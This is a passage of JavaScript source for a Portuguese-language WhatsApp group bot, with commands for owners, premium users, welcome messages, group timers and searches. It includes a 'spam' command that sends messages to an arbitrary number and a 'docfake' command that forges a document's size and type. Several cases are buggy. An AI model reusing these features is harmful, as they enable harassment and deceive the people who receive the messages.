║➪𝐁𝐲: ${NickDono}        
┗══━®[✯✯✯✯✯✯]©━══━┛`
await conn.sendMessage(from, {text: resul}, {quoted: info})
break

case 'ganharlevel':
if(!SoDono) return reply("Você não é dono para utilizar este comando...")
addLevelingLevel(sender, 10)
reply("Olá chefe, foi adicionado 10 Level para você 🙂")
break

case 'ganharxp':
if(!SoDono) return reply("Você não é dono para utilizar este comando...")  
addLevelingXp(sender, 5000)
reply("Foi adicionado 5000 mil de XP para você 🙂")
break

case 'envmsg':
if(!SoDono && !isnit) return
var [tx1, tx2] = q.split("/")
conn.sendMessage(tx1, {text: tx2})
break

case 'bcgp':
case 'bcgc':  
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (args.length < 1) return reply('.......')
fgp = await groupMembers
var nomor = info.participant
if (isMedia && !info.message.videoMessage || isQuotedImage) {
encmedia = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage, 'image')
for (let _ of fgp) {
conn.sendMessage(_.id, {image: buff}, {caption: `*「 TRANSMISSÃO 」*\n\nGrupo: ${groupName}\n Número: wa.me/${(sender.split('@')[0])}\nMensagem : ${body.slice(6)}`})
}
reply('')
} else {
for (let _ of fgp) {
sendMess(_.id, `*「 TRANSMISSÃO 」*\n\nGrupo : ${groupName}\n Número : wa.me/${(sender.split('@')[0])}\nMensagem : ${body.slice(6)}`)
}
reply('Grupo de transmissão bem-sucedido')
} 
break

case 'dono1':
if (args.length < 1) return
if (!SoDono  && !isnit && !issupre && !ischyt) return reply(enviar.msg.donosmt)
dono1 = body.slice(8)
nescessario.dono1 = dono1
fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
reply(`Agora contem um segundo dono(a) alterado com sucesso para: ${dono1}`)
break

case 'vemqrcode':
if(!SoDono) return reply("Apenas Dono..")
bla = fs.readFileSync("./ALEATORY-QR.json")
conn.sendMessage(from, {document: bla, mimetype: 'document/json', fileName: 'ALEATORY-QR.json'})
break

case 'dono2':
if (args.length < 1) return
if (!SoDono  && !isnit && !issupre && !ischyt) return reply(enviar.msg.donosmt)
dono2 = body.slice(8)
nescessario.dono2 = dono2
fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
reply(`Agora contem um segundo dono(a) alterado com sucesso para: ${dono2}`)
break

case 'dono3':
if (args.length < 1) return
if (!SoDono  && !isnit && !issupre && !ischyt) return reply(enviar.msg.donosmt)
dono3 = body.slice(8)
nescessario.dono3 = dono3
fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
reply(`Agora contem um terceiro dono(a) alterado com sucesso para: ${dono3}`)
break

case 'dono4':
if (args.length < 1) return
if (!SoDono  && !isnit && !issupre && !ischyt) return reply(enviar.msg.donosmt)
dono4 = body.slice(8)
nescessario.dono4 = dono4
fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
reply(`Agora contem um quarto dono(a) alterado com sucesso para: ${dono4}`)
break

case 'dono5':
if (args.length < 1) return
if (!SoDono  && !isnit && !issupre && !ischyt) return reply(enviar.msg.donosmt)
dono5 = body.slice(8)
nescessario.dono5 = dono5
fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
reply(`Agora contem um quinto dono(a) alterado com sucesso para: ${dono5}`)
break

case 'dono6':
if (args.length < 1) return
if (!SoDono  && !isnit && !issupre && !ischyt) return reply(enviar.msg.donosmt)
dono6 = body.slice(8)
nescessario.dono6 = dono6
fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
reply(`Agora contem um quinto dono(a) alterado com sucesso para: ${dono6}`)
break

case 'getquoted':
reply(JSON.stringify(info.message.extendedTextMessage.contextInfo, null, 3))
break

case 'donos':
p = `[ Lista de donos do bot ${setting.NomeDoBot} ] 

Dono Oficial do bot: ${setting.numerodono}

- [ 1 ] ${nescessario.dono1}\n- [ 2 ] ${nescessario.dono2}\n- [ 3 ] ${nescessario.dono3}\n- [ 4 ] ${nescessario.dono4}\n- [ 5 ] ${nescessario.dono5}\n- [ 6 ] ${nescessario.dono6} `
reply(p)
break

case 'admins':
case 'listadmins':  
case 'listaadmins':   
if (!isGroup) return reply(enviar.msg.grupo)
ytb = `Lista de admins do grupo *${groupMetadata.subject}*\nTotal : ${groupAdmins.length}\n\n`
no = 0
for (let admon of groupAdmins) {
no += 1
ytb += `[${no.toString()}] @${admon.split('@')[0]}\n`
}
mentions(ytb, groupAdmins, true)
break

case 'aviso_gp':
if(!SoDono) return reply("Apenas dono...")
if(budy.includes(`${prefix}execut`) || budy.includes(`=>`) || budy.includes(`>`)) return
if(!budy.includes("|")) return reply(`Cadê a |\nExemplo: ${prefix}aviso_gp jantar já está pronto|19/00/00`)
var[qds, qds2] = q.split("|")  
var blaaviso_ndms = `./func/avisos/aviso_${from}.json`
if(fs.existsSync(blaaviso_ndms)) {
var avisos_gps = JSON.parse(fs.readFileSync(blaaviso_ndms))
}
if(!fs.existsSync(blaaviso_ndms)) {
var avs = {
texto: qds, 
hora: qds2
}
fs.writeFileSync(blaaviso_ndms, JSON.stringify(avs, null, 2))
reply(`Aviso feito com sucesso, programado para todos os dias...`)
} else {
if(fs.existsSync(blaaviso_ndms)) {
fs.unlinkSync(blaaviso_ndms)
var avs = {
texto: qds, 
hora: qds2
}
fs.writeFileSync(blaaviso_ndms, JSON.stringify(avs, null, 2))
reply(`Aviso re-feito com sucesso, programado para todos os dias..`)
}
}
break

case 'criartabela': case 'criartbl': case 'criartab':
if(!isGroupAdmins && !SoDono) return reply("Só adm ou dono pode utilizar este comando.")
msgz = args.join(" ")

msgtmpol = moment.tz('America/Sao_Paulo').format('HH:mm:ss');

datinhaofc = moment.tz('America/Sao_Paulo').format('DD/MM/YY');

var blarpty = {
Horario: msgtmpol, 
Data: datinhaofc, 
Tabela: msgz
}

if(!fs.existsSync(`./func/tabela/tabela-${from}.json`)) {
fs.writeFileSync(`./func/tabela/tabela-${from}.json`,
JSON.stringify(blarpty, null, 2));
} else {
if (fs.existsSync("./func/tabela/tabela-" + from + ".json")) {
fs.unlinkSync("./func/tabela/tabela-" + from + ".json");
fs.writeFileSync(`./func/tabela/tabela-${from}.json`,
JSON.stringify(blarpty, null, 2));
}
}
reply(`Tabela do grupo foi criada com sucesso..`)
break

case 'tabelagp': case 'tabeladogp': case 'tabelinha': 
if(!fs.existsSync(`./func/tabela/tabela-${from}.json`)) {
reply(`Cade a tabela, cria ela com o comando\nExemplo : ${prefix}criartabela lindas do grupo : e etc ..`)
}
const tabelagpofc = JSON.parse(fs.readFileSync(`./func/tabela/tabela-${from}.json`)); 

blity = `- ⏰ Horário que criou a Tabela : ${tabelagpofc.Horario}\n\n- 🗓️ Data que criou a Tabela : ${tabelagpofc.Data}\n\n - Tabela : ${tabelagpofc.Tabela}`

conn.sendMessage(from, {text: blity}, {quoted: info})
break

case 'alugado': case 'tempodesair': case 'tempo-aluguel': case 'aluguel': 
if(!SoDono && !info.key.fromMe) return 
txt = args.join(" ")
if(!txt.includes("/")) return reply(`O formato da data é assim : 03/04/22`)
msgz = args.join(" ").replace(" ", "")

datinhaofc = moment.tz('America/Sao_Paulo').format('DD/MM/YY');

var blarpty = {
Data_que_alugou: datinhaofc, 
Data_de_sair: msgz
}

if(!fs.existsSync(`./func/sairgp/sairgp-${from}.json`)) {
fs.writeFileSync(`./func/sairgp/sairgp-${from}.json`,
JSON.stringify(blarpty, null, 2));
} else {
if (fs.existsSync("./func/sairgp/sairgp-" + from + ".json")) {
fs.unlinkSync("./func/sairgp/sairgp-" + from + ".json");
fs.writeFileSync(`./func/sairgp/sairgp-${from}.json`,
JSON.stringify(blarpty, null, 2));
}
}
reply(`Tempo de quando vai expirar o aluguel do bot e irei sair na data exata..`)
break

case 'tempo-fgp': 
if(!SoDono) return 
txt = args.join(" ")
.replace(" |", "|")
.replace("| ", "|")
var [txt1,txt2] = txt.split('|')
var blarpty = {
fechargp: txt1, 
abrirgp: txt2, 
grupoid: from
}

if(!fs.existsSync(`./func/fgp-${from}.json`)) {
fs.writeFileSync(`./func/fgp-${from}.json`,
JSON.stringify(blarpty, null, 2));
} else {
if (fs.existsSync("./func/fgp-" + from + ".json")) {
fs.unlinkSync("./func/fgp-" + from + ".json");
fs.writeFileSync(`./func/fgp-${from}.json`,
JSON.stringify(blarpty, null, 2));
}
}
reply(`Tempo determinado..`)
break

case 'fechar-gp':
if(!SoDono) return reply("Comando especial para o dono.")
if(!q.includes("/") && !q.length <= 17) return reply(`Olá, você tem que determinar os 2 tempo pra o bot fechar o grupo e abrir, por exemplo..\n${prefix}fechar-gp 1m/2m\n\nEle fechará o grupo depois de um minuto, e depois abre após 2 minutos....`)
qtxt = args.join(" ").replace(" /", "/").replace("/ ", "/").replace("1m", "60000").replace("2m", "120000").replace("3m", "180000").replace("30m", "1800000").replace("1h", "3600000").replace("2h", "7200000").replace("7h", "25200000")

txt1 = qtxt.split("/")[0]
txt2 = qtxt.split("/")[1]

var fcgp = {
tempo1: txt1, 
tempo2: txt2, 
grupo: from
}

if(!fs.existsSync(`./func/fechar-abrir-gp-${from}.json`)) {
fs.writeFileSync(`./func/fechar-abrir-gp-${from}.json`,
JSON.stringify(fcgp, null, 2));
} else {
if (fs.existsSync("./func/fechar-abrir-gp-" + from + ".json")) {
fs.unlinkSync("./func/fechar-abrir-gp-" + from + ".json");
fs.writeFileSync(`./func/fechar-abrir-gp-${from}.json`,
JSON.stringify(fcgp, null, 2));
}
}
reply(`Tempo de fechar o grupo e abrir em tal horário foi programado com sucesso..`)

const tempodttl = JSON.parse(fs.readFileSync(`./func/fechar-abrir-gp-${from}.json`)); 

setTimeout(async () => {
reply("Grupo Fechado..")
await conn.groupSettingUpdate(from, 'announcement')  
}, `${tempodttl.tempo1}`)

setTimeout(async () => {
reply("Grupo Aberto..")
await conn.groupSettingUpdate(from, 'not_announcement')  
}, `${tempodttl.tempo2}`)

break


case 'ausente': case 'off': case 'afk':
if(!SoDono) return reply("Comando especial para o dono.")
msgtmp = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
nmrdnofc = setting.numerodono.replace(new RegExp("[()+-/ +/]", "gi"), "")
msgz = args.join(" ")

var catmsgaus = {
Ausente_Desde: msgtmp, 
Motivo_Da_Ausência: msgz
}

if(!fs.existsSync(`./func/afk/afk-@${nmrdnofc}.json`)) {
fs.writeFileSync(`./func/afk/afk-@${nmrdnofc}.json`,
JSON.stringify(catmsgaus, null, 2));
} else {
if (fs.existsSync("./func/afk/afk-@" + nmrdnofc + ".json")) {
fs.unlinkSync("./func/afk/afk-@" + nmrdnofc + ".json");
fs.writeFileSync(`./func/afk/afk-@${nmrdnofc}.json`,
JSON.stringify(catmsgaus, null, 2));
}
}
reply(`Mensagem de ausência criada com sucesso...`), {quoted: selo}
break

case 'ativo': case 'on': case 'voltei':
if(!SoDono) return reply("Comando especial para o dono.")
nmrdnofc = setting.numerodono.replace(new RegExp("[()+-/ +/]", "gi"), "")
if (fs.existsSync("./func/afk/afk-@" + nmrdnofc + ".json")) {  
fs.unlinkSync("./func/afk/afk-@" + nmrdnofc + ".json");
reply("Bem vindo de volta, agora você está online 🙂")
} else {
reply("Você não registrou nenhuma mensagem de ausência...")
}
break

case 'serpremium':
case 'serprem':  
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
premium.push(`${setting.numerodono}@s.whatsapp.net`)
fs.writeFileSync('./datab/usuarios/premium.json', JSON.stringify(premium))
reply(`Pronto ${setting.numerodono} você foi adicionado na lista premium.`)
break

case 'samuel':
const reactionMessage = {
react: {
text: "🥵",
key: info.key
}
}
sendMsg = await conn.sendMessage(from, reactionMessage)
break

case 'addpremium':
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return 
if (!budy.includes("@55")) {
bla = premium.includes(menc_prt)
if(bla) return reply("*Este número já está incluso..*")  
premium.push(`${menc_prt}`)
fs.writeFileSync('./datab/usuarios/premium.json', JSON.stringify(premium))
conn.sendMessage(from, {text: `👑@${menc_prt.split("@")[0]} foi adicionado à lista de usuários premium com sucesso👑`, mentions: [menc_prt]}, {quoted: info})  
} else { 
bla = premium.includes(menc_jid)
if(bla) return reply("*Este número já está incluso..*")  
premium.push(`${menc_jid}`)
fs.writeFileSync('./datab/usuarios/premium.json', JSON.stringify(premium))
tedtp = args.join(" ").replace("@", "")
conn.sendMessage(from, {text: `👑@${tedtp} foi adicionado à lista de usuários premium com sucesso👑`, mentions: [menc_jid]}, {quoted: info})
}
break 

case 'delpremium':
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return  reply(enviar.msg.donosmt)
if (!budy.includes("@55")) {
bla = premium.includes(menc_prt)
if(!bla) return reply("*Este número não está incluso na lista premium..*")  
pesquisar = menc_prt
processo = premium.indexOf(pesquisar)
while(processo >= 0){
premium.splice(processo, 1)
processo = premium.indexOf(pesquisar)
}
fs.writeFileSync('./datab/usuarios/premium.json', JSON.stringify(premium))
conn.sendMessage(from, {text: ` ${menc_prt.split("@")[0]} foi tirado da lista premium com sucesso..`}, {quoted: info})
} else {
bla = premium.includes(menc_jid)
if(!bla) return reply("*Este número não está incluso na lista premium..*")  
pesquisar = menc_jid
processo = premium.indexOf(pesquisar)
while(processo >= 0){
premium.splice(processo, 1)
processo = premium.indexOf(pesquisar)
}
fs.writeFileSync('./datab/usuarios/premium.json', JSON.stringify(premium))
conn.sendMessage(from, {text: ` ${bla.split("@")[0]} foi tirado da lista premium com sucesso..`}, {quoted: info})
}
break

case 'limpar':
if(!isGroup) return reply(enviar.msg.grupo)
if(!isGroupAdmins) return reply(enviar.msg.adm)
clear = `🗑️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nn\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n🗑️\n❲❗❳ *Lɪᴍᴘᴇᴢᴀ ᴅᴇ Cʜᴀᴛ Cᴏɴᴄʟᴜɪ́ᴅᴀ* ✅`
conn.sendMessage(from, {text: clear}, {quoted: selo, contextInfo : { forwardingScore: 500, isForwarded:true}})
break
case 'clearchat':
case 'limparchat':  
case 'limparmsg':  
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
await conn.chatModify({ clear: { message: { id: String, fromMe: true } } }, from, [])
reply("Chat limpo")
break
case 'spam': 	
if (!SoDono) return reply(enviar.msg.donosmt)
if (args.length < 1) return reply(`Use assim:  exemplo : ${prefix}spam 556181496039 corno`)
if (args[0].startsWith('08')) return reply('coloque o número do país exemplo : 55')
//if (args[0].startsWith(`${ownerNumberB}`)) return reply(`Eu não posso enviar spam para meu criador ${namaowner} 😞`)
mansed = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
const kontul = body.slice(8)
if (kontul.length > 300) return conn.sendMessage(from, 'Desculpe, o texto é muito longo, máximo de 300 textos', text, {quoted: info})
var options = {
text: busah,
contextInfo: {mentionedJid: [nomor]},
}
conn.sendMessage(`${mansed}`, options, busa, text, {quoted: info})
.then(() => { conn.sendMessage(sender, `${mansed}`, options, busa, text, {quoted: info})})
reply('Spam enviado com sucesso')
break
case 'addpalavra':
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
if (args.length < 1) return reply( `Use assim : ${prefix + command} [palavrão]. exemplo ${prefix + command} puta`)
const bw = body.slice(12)
palavra.push(bw)
fs.writeFileSync('./datab/grupos/palavras.json', JSON.stringify(palavra))
reply('Palavrão adicionado com sucesso!')
await limitAdd(sender)
break

case 'delpalavra':
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
if (args.length < 1) return reply( `Use assim : ${prefix + command} [palavrão]. exemplo ${prefix + command} puta`)
let dbw = body.slice(12)
palavra.splice(dbw)
fs.writeFileSync('./datab/grupos/palavras.json', JSON.stringify(palavra))
reply('Palavrão removido da lista com sucesso!')
await limitAdd(sender)
break

case 'listapalavrão': case 'listapalavra':
case 'listpalavra':
let lbw = `Esta é a lista de palavrão\nTotal : ${palavra.length}\n`
for (let i of palavra) {
lbw += `➸ ${i.replace(palavra)}\n`
}
await reply(lbw)
await limitAdd(sender)
break 

case 'legendabv':  
if(!isGroup) return reply('Este comando só deve ser utilizado em Grupo.')
if(!isGroupAdmins) return reply(`Só ADM pode utilizar este comando.`)
if(!isWelkom) return reply("Esta legenda de bem vindo, faz parte do bem vindo normal, para utilizar você deve ativar o bemvindo 1")
if(args.length < 1) return reply('*Escreva a mensagem de boas-vindas*')
teks = body.slice(11)
if(isWelcomed) {
var ind = groupIdWelcomed.indexOf(from)
welcome_group[ind].msg = teks
fs.writeFileSync('./datab/grupos/welcomegp.json', JSON.stringify(welcome_group, null, 2) + '\n')
reply('*Mensagem de boas vindas alteradas com sucesso!*')
} else {
var json = {
id: from,
msg: teks
}
welcome_group.push(json)
fs.writeFileSync('./datab/grupos/welcomegp.json', JSON.stringify(welcome_group, null, 2) + '\n')
reply('*Mensagem de boas vindas criada com sucesso!*')
}
break

case 'legendasaiu':
if(!isGroup) return reply(`Só em grupo pode utilizar este comando.`)
if(!isGroupAdmins) return reply(`Só ADM pode utilizar este tipo de Comando.`)
if(!isWelkom) return reply("Esta legenda de saiu, faz parte do bem vindo normal, para utilizar você deve ativar o bemvindo 1")
if(args.length < 1) return reply('*Escreva a mensagem de saída*')
teks = body.slice(13)
if(isByed) {
var ind = groupIdBye.indexOf(from)
bye_group[ind].msg = teks
fs.writeFileSync('./datab/grupos/byegp.json', JSON.stringify(bye_group, null, 2) + '\n')
reply('*Mensagem de saída alteradas com sucesso!*')
} else {
var json = {
id: from,
msg: teks
}
bye_group.push(json)
fs.writeFileSync('./datab/grupos/byegp.json', JSON.stringify(bye_group, null, 2) + '\n')
reply('*Mensagem de saída criada com sucesso!*')
}
break

case 'legendabv2':  
if(!isGroup) return reply('Este comando só deve ser utilizado em Grupo.')
if(!isGroupAdmins) return reply(`Só ADM pode utilizar este comando.`)
if(args.length < 1) return reply('*Escreva a mensagem de boas-vindas*')
teks = body.slice(12)
if(isWelcomed2) {
var ind = groupIdWelcomed2.indexOf(from)
welcome_group2[ind].msg = teks
fs.writeFileSync('./datab/grupos/welcomegp2.json', JSON.stringify(welcome_group2, null, 2) + '\n')
reply('*Mensagem de boas vindas2 alteradas com sucesso!*')
} else {
var json = {
id: from,
msg: teks
}
welcome_group2.push(json)
fs.writeFileSync('./datab/grupos/welcomegp2.json', JSON.stringify(welcome_group2, null, 2) + '\n')
reply('*Mensagem de boas vindas2 criada com sucesso!*')
}
break
case 'anime': {
if(!q.length > 1) return reply("Cade o título que deseja pesquisar?")
var Lrows = []
datab = await fetchJson(`https://apis.nezsab-apis.xyz/api/animes?q=${q}&apikey=${Luix1397}`)
for(let a of datab.resultado) {
Lrows.push({title: a.titulo, description: `Link: ${a.link}`, rowId: `inhaê`})
}
listMessage = {
text: `Selecione para ver as informações\ndetalhadas sobre o resultado!`,
footer: `By: ${setting.NomeDoBot}`,
title: `⸺͟͞ꪶ𝐏𝐄𝐒𝐐𝐔𝐈𝐒𝐀: 𝐀𝐍𝐈𝐌𝐄ꫂ ✰✰✰`,
buttonText: "🧧𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐀𝐑🧧️",
sections: [{
title: `${setting.NomeDoBot}`, 
rows: Lrows
}
]
}
conn.sendMessage(from, listMessage)
}
break

case 'sfile': {
if(!q.length > 1) return reply("Cade o título que deseja pesquisar?")
var Lrows = []
datab = await fetchJson(`https://apis.nezsab-apis.xyz/api/sfile?q=${q}&apikey=${Luix1397}`)
for(let a of datab.resultado) {
Lrows.push({title: `➡️ Arquivo: ${a.nome}`, description: `Icone: ${a.icon}\nLink: ${a.link}`, rowId: `inhaê`})
}
listMessage = {
text: `Selecione para ver as informações\ndetalhadas sobre o resultado!`,
footer: `By: ${setting.NomeDoBot}`,
title: `⸺͟͞ꪶ𝐏𝐄𝐒𝐐𝐔𝐈𝐒𝐀: 𝐒𝐅𝐈𝐋𝐄ꫂ ✰✰✰✰`,
buttonText: "🧧𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐀𝐑🧧️",
sections: [{
title: `${setting.NomeDoBot}`, 
rows: Lrows
}
]
}
conn.sendMessage(from, listMessage)
}
break
case 'legendasaiu2':
if(!isGroup) return reply(`Só em grupo pode utilizar este comando.`)
if(!isGroupAdmins) return reply(`Só ADM pode utilizar este tipo de Comando.`)
if(args.length < 1) return reply('*Escreva a mensagem de saída*')
teks = body.slice(14)
if(isByed) {
var ind = groupIdBye.indexOf(from)
bye_group2[ind].msg = teks
fs.writeFileSync('./datab/grupos/byegp2.json', JSON.stringify(bye_group2, null, 2) + '\n')
reply('*Mensagem de saída2 alteradas com sucesso!*')
} else {
var json = {
id: from,
msg: teks
}
bye_group2.push(json)
fs.writeFileSync('./datab/grupos/byegp2.json', JSON.stringify(bye_group2, null, 2) + '\n')
reply('*Mensagem de saída2 criada com sucesso!*')
}
break

case 'deletar':  case 'apagar':  case 'delete':   case 'del':  case 'd':
if (!isGroup)return reply(enviar.msg.grupo)
if (!SoDono && !isGroupAdmins && !isPremium) return reply(enviar.msg.adm)
conn.sendMessage(from, { delete: { remoteJid: from, fromMe: true, id: info.message.extendedTextMessage.contextInfo.stanzaId, participant: sender }})
.catch((err) => { 
console.log(err)
reply('A mensagem não foi enviado pelo bot...')
})
break

case 'fundobemvindo':
case 'fundobv':  
if (!SoDono  && !isnit && !info.key.fromMe) return reply(enviar.msg.donosmt)
if(!isQuotedImage) return reply("Marque uma imagem")
reply('Você deve marcar uma imagem com esse comando, se não for de primeira, tente novamente, ok? ')
if ((isMedia && !info.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info
owgi = await getFileBuffer(boij, 'image')
res = await upload(owgi)
fundo1 = res
nescessario.fundo1 = fundo1
fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
reply(`A imagem de bem vindo foi alterado com sucesso para: ${fundo1}`)
}
break

case 'fundosaiu':
if (!SoDono  && !isnit && !info.key.fromMe) return reply(enviar.msg.donosmt)
if(!isQuotedImage) return reply("Marque uma imagem")
reply('Você deve marcar uma imagem com esse comando, se não for de primeira, tente novamente, ok? ')
if ((isMedia && !info.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info
owgi = await getFileBuffer(boij, 'image')
res = await upload(owgi)
fundo2 = res
nescessario.fundo2 = fundo2
fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
reply(`A imagem de saiu foi alterado com sucesso para: ${fundo2}`)
}
break
/*case 'antispam':
try {
if (!SoDono  && !m.key.fromMe) return reply(enviar.msg.donosmt)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isAntiSpamcmd) return reply('Ja esta ativo')
antispamcmd.push('Ativado')
fs.writeFileSync('./armor/funcoes/antispamcmd.json', JSON.stringify(antispamcmd))
reply('Ativou com sucesso o recurso de anti spam de comando no bot✔️')
} else if (Number(args[0]) === 0) {
fs.writeFileSync('./armor/funcoes/antispamcmd.json', JSON.stringify([]))
reply('<❗> Desativou com sucesso o recurso de anti spam de comando no bot.️')
} else {
reply('1 para ativar, 0 para desativar')
}}
break*/
case 'antispam':
try {
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isAntiSpamcmd) return reply('Ja esta ativo')
antispamcmd.push('Ativado')
fs.writeFileSync('./armor/funcoes/antispamcmd.json', JSON.stringify(antispamcmd))
reply('Ativou com sucesso o recurso de antispam no bot✔️')
} else if (Number(args[0]) === 0) {
if (!isAntiSpamcmd) return reply('Ja esta Desativado')  
fs.writeFileSync('./armor/funcoes/antispamcmd.json', JSON.stringify([]))
reply('Desativou com sucesso o recurso de antispam no bot✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
} catch {
reply('Falha ao ativar')
}
break
case 'antiligar':
case 'antiligacao':  
case 'antiligação':  
try {
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isAnticall) return reply('Ja esta ativo')
anticall.push('Ativado')
fs.writeFileSync('./datab/usuarios/anticall.json', JSON.stringify(anticall))
reply('Ativou com sucesso o recurso de antiligação no bot✔️')
} else if (Number(args[0]) === 0) {
if (!isAnticall) return reply('Ja esta Desativado')  
fs.writeFileSync('./datab/usuarios/anticall.json', JSON.stringify([]))
reply('Desativou com sucesso o recurso de antiligação no bot✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
} catch {
reply('Falha ao ativar')
}
break

case 'antipvon':
case 'fim':
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe ) return reply('Apenas Meu Dono')
if (banChats) return await reply('já está ativo o modo antipv')
banChats = true
nescessario.banChats = banChats
fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
await conn.sendMessage(from, {text: "『👻』 *ATENDIMENTO CONCLUÍDO COM SUCESSO*"}, {quoted: selo})
break

case 'atendimento':
case 'antipvoff':
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return await reply('Apenas meu dono o owner')
if (!banChats) return await reply('Nao estava ativado ainda')
banChats = false
nescessario.banChats = banChats
fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
await conn.sendMessage(from, {text: `╔══❖•ೋ°ৡৢ͜͡👻𖥨֗°ೋ•❖══╗
║ *❀֟፝֟͜͜͡͡͡𝄞⃟MODO ✰͜͡ATENDIMENTO*
╚══❖•ೋ°ৡৢ͜͡👻𖥨֗°ೋ•❖══╝\n`}, {quoted: selo})
break
case 'docfake': //BY CARLOS/JESQUINHA-MD 
try {
sprd = "|"
if(!q) {
let buttonss = [
{buttonId: `$prefix}obrigado`, buttonText: {displayText: '✰ۜ͜͡OK'}, type: 1}]
let buttonMessage = {
document: fs.readFileSync('./docf.txt'),
mimetype: 'application/vnd.android.package-archive',
fileName: `exemplo`,
fileLength: 500000000,
caption: `${prefix + command} exemplo${sprd}500${sprd}apk

Os tipos aceitos por enquanto são:

> pdf
> xml
> zip
> jpg
> ppt
> apk
> txt
> aac
> pptx
> aac
> m4a
> mp4
> mp3
> svg
> png`,
}
return conn.sendMessage(from, buttonMessage, {quoted: selo})
}
kls = args.join(' ')
let nomedoc = kls.split(sprd)[0] || `${NomeDoBot}`
let peso = kls.split(sprd)[1] * 1000000 || '1000000'
let mimetyp = kls.split(sprd)[2].replace(" ", "") || 'gif'
let thumbc = kls.split(sprd)[3] || 'https://google.com/'
if(mimetyp.toLowerCase() == 'pdf') mimetyp = 'application/pdf'
if(mimetyp.toLowerCase() == 'apk') mimetyp = 'application/vnd.android.package-archive'
if(mimetyp.toLowerCase() == 'aac') mimetyp = 'audio/aac'
if(mimetyp.toLowerCase() == 'xml') mimetyp = 'application/xml'
if(mimetyp.toLowerCase() == 'zip') mimetyp = 'application/zip'
if(mimetyp.toLowerCase() == 'jpg') mimetyp = 'image/jpeg'
if(mimetyp.toLowerCase() == 'ppt') mimetyp = 'application/vnd.ms-powerpoint'
if(mimetyp.toLowerCase() == 'pptx') mimetyp = 'application/vnd.openxmlformats-officedocument.presentationml.presentation'
if(mimetyp.toLowerCase() == 'mp4') mimetyp = 'video/mp4'
if(mimetyp.toLowerCase() == 'm4a') mimetyp = 'audio/mp4'
if(mimetyp.toLowerCase() == 'mp3') mimetyp = 'audio/mpeg'
if(mimetyp.toLowerCase() == 'gif') mimetyp = 'image/gif'
if(mimetyp.toLowerCase() == 'png') mimetyp = 'image/png'
if(mimetyp.toLowerCase() == 'svg') mimetyp = 'image/svg+xml'
